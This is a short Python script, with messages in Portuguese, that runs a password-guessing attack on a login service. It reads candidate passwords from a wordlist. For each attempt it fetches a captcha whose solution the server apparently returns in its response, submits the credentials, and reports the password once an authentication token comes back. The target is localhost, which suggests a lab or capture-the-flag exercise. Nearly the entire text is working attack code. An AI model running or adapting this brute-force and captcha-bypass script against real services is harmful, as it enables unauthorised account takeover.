import requests
import sys
import json
import argparse

def get_captcha():
    try:
        response = requests.get("http://localhost:443/captcha")
        response.raise_for_status()
        data = response.json()
        return data['captcha_solution'], data['captcha_id']
    except requests.exceptions.RequestException as e:
        print("Erro ao obter o captcha:", e)
        sys.exit(1)

def authenticate(username, password, solution, captcha_id):
    try:
        headers = {'Content-Type': 'application/json'}
        payload = json.dumps({
            "username": username,
            "password": password,
            "captcha_id": captcha_id,
            "captcha_solution": solution
        })
        response = requests.request("POST", "http://localhost:443/authenticate", headers=headers, data=payload)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(e)
        print("Erro ao autenticar, username: %s e password: %s" % (username, password))

def main():
    parser = argparse.ArgumentParser(description="Script de autenticação com lista de senhas.")
    parser.add_argument("-u", "--user", type=str, help="Usuário para o qual pesquisar senhas")
    parser.add_argument("-l", "--list", type=str, help="Arquivo contendo a lista de senhas")
    args = parser.parse_args()

    if not args.list:
        parser.print_help()
        sys.exit(1)

    passwords_filename = args.list
    search_user = args.user

    with open(passwords_filename, 'r') as passwords_file:
        for password in passwords_file:
            solution, captcha_id = get_captcha()
            result = authenticate(search_user, password.strip(), solution, captcha_id)
            if 'token' in result:
                print("Senha encontrada: ", password.strip())
                sys.exit(1)

if __name__ == "__main__":
    main()
